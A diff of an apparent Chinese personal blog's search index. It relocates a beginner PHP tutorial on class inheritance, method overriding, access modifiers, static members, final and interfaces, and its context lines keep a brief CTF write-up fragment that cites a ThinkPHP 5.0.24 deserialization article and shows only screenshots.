 <p>参考文章：<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
 <p>打开后的首页，首页什么信息都没有，只有一个fake_flag查看详情里也没有什么信息</p>
@@ -1702,44 +1706,6 @@
 <p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165720197.png" alt="image-20231218165720197"></p>
 <p>最后就可以命令执行了</p>
 <p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165742506.png" alt="image-20231218165742506"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>php的类</title>
-    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<p>PHP类的基本操作</p>
-<span id="more"></span>
-
-<h4 id="1-类的继承"><a href="#1-类的继承" class="headerlink" title="1.类的继承"></a>1.类的继承</h4><p>extends关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //创建一个human父类</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父亲说话的方法，姓名：&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;父亲吃饭的方法\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //这里sport继承了human，sport为子类,human为父类</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;我正在跑步，我是一名&quot; . $this-&gt;type . &quot;运动员\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //这里host继承了human，host为子类,human为父类</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;我正在表演一个节目，我是&quot;.$this-&gt;tele.&quot;电视台的主持人\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;乔丹&quot;,&quot;篮球&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;张三&quot;,&quot;北京卫视&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>
-
-<p>输出</p>
-<p>父亲说话的方法，姓名：乔丹 我正在跑步，我是一名篮球运动员 父亲吃饭的方法 我正在表演一个节目，我是北京卫视电视台的主持人</p>
-<h4 id="2-方法重写"><a href="#2-方法重写" class="headerlink" title="2.方法重写"></a>2.方法重写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //在子类中再次声明一个say方法，这样可以覆盖父类中的say方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;子类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>
-
-<p>输出   子类说话的方法</p>
-<h4 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3.访问控制"></a>3.访问控制</h4><p>public关键字:定义公共的成员属性或方法，任何地方都可使用</p>
-<p>protected关键字:定义受保护的成员属性或方法，只允许类本身或子类使用</p>
-<p>private关键字:定义私有的成员属性或方法，只允许类的本身使用</p>
-<h4 id="4-静态"><a href="#4-静态" class="headerlink" title="4.静态"></a>4.静态</h4><p>static关键字</p>
-<ul>
-<li>静态属性用于保存类的公有数据；</li>
-<li>静态方法里面只能访问静态属性或方法，<strong>不能使用 $this 伪变量</strong>；</li>
-<li>静态成员<strong>不需要通过 new 关键字来实例化对象</strong>就可访问使用；</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;张三&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;我的名字叫:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //以此来调用静态属性$name</span><br><span class="line">human::say();   //以此来使用静态方法say</span><br></pre></td></tr></table></figure>
-
-<p>输出 张三我的名字叫:张三</p>
-<h4 id="5-final关键字"><a href="#5-final关键字" class="headerlink" title="5.final关键字"></a>5.final关键字</h4><p>不允许成员方法被重写，不允许被继承</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //这样这个eat方法子类将不能使用</span><br><span class="line">        echo &quot;父亲吃饭的方法，不允许子类重写&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //这样sport不能再创建子类</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;子类吃饭的方法，此时程序将会报致命错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //这里继承了sport类会报错</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;张三&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>上面输出的结果会报错</p>
-<h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6.接口"></a>6.接口</h4><p>定义接口关键字：interface</p>
-<p>实现接口方法关键字：implements</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //定义一个接口</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //连接接口</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;我吃：&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //连接接口</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我吃:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>输出</p>
-<p>我吃：rice我吃:banana</p>
 ]]></content>
   </entry>
   <entry>
@@ -1906,6 +1872,44 @@
 <p><strong>in_array() 检查数组中是否存在某个值，存在返回true 否则false</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出  found</span><br></pre></td></tr></table></figure>
 
+]]></content>
+  </entry>
+  <entry>
+    <title>php的类</title>
+    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<p>PHP类的基本操作</p>
+<span id="more"></span>
+
+<h4 id="1-类的继承"><a href="#1-类的继承" class="headerlink" title="1.类的继承"></a>1.类的继承</h4><p>extends关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //创建一个human父类</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父亲说话的方法，姓名：&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;父亲吃饭的方法\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //这里sport继承了human，sport为子类,human为父类</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;我正在跑步，我是一名&quot; . $this-&gt;type . &quot;运动员\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //这里host继承了human，host为子类,human为父类</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;我正在表演一个节目，我是&quot;.$this-&gt;tele.&quot;电视台的主持人\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;乔丹&quot;,&quot;篮球&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;张三&quot;,&quot;北京卫视&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p>父亲说话的方法，姓名：乔丹 我正在跑步，我是一名篮球运动员 父亲吃饭的方法 我正在表演一个节目，我是北京卫视电视台的主持人</p>
+<h4 id="2-方法重写"><a href="#2-方法重写" class="headerlink" title="2.方法重写"></a>2.方法重写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //在子类中再次声明一个say方法，这样可以覆盖父类中的say方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;子类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>
+
+<p>输出   子类说话的方法</p>
+<h4 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3.访问控制"></a>3.访问控制</h4><p>public关键字:定义公共的成员属性或方法，任何地方都可使用</p>
+<p>protected关键字:定义受保护的成员属性或方法，只允许类本身或子类使用</p>
+<p>private关键字:定义私有的成员属性或方法，只允许类的本身使用</p>
+<h4 id="4-静态"><a href="#4-静态" class="headerlink" title="4.静态"></a>4.静态</h4><p>static关键字</p>
+<ul>
+<li>静态属性用于保存类的公有数据；</li>
+<li>静态方法里面只能访问静态属性或方法，<strong>不能使用 $this 伪变量</strong>；</li>
+<li>静态成员<strong>不需要通过 new 关键字来实例化对象</strong>就可访问使用；</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;张三&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;我的名字叫:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //以此来调用静态属性$name</span><br><span class="line">human::say();   //以此来使用静态方法say</span><br></pre></td></tr></table></figure>
+
+<p>输出 张三我的名字叫:张三</p>
+<h4 id="5-final关键字"><a href="#5-final关键字" class="headerlink" title="5.final关键字"></a>5.final关键字</h4><p>不允许成员方法被重写，不允许被继承</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //这样这个eat方法子类将不能使用</span><br><span class="line">        echo &quot;父亲吃饭的方法，不允许子类重写&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //这样sport不能再创建子类</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;子类吃饭的方法，此时程序将会报致命错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //这里继承了sport类会报错</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;张三&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>上面输出的结果会报错</p>
+<h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6.接口"></a>6.接口</h4><p>定义接口关键字：interface</p>
+<p>实现接口方法关键字：implements</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //定义一个接口</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //连接接口</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;我吃：&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //连接接口</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我吃:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p>我吃：rice我吃:banana</p>
 ]]></content>
   </entry>
   <entry>
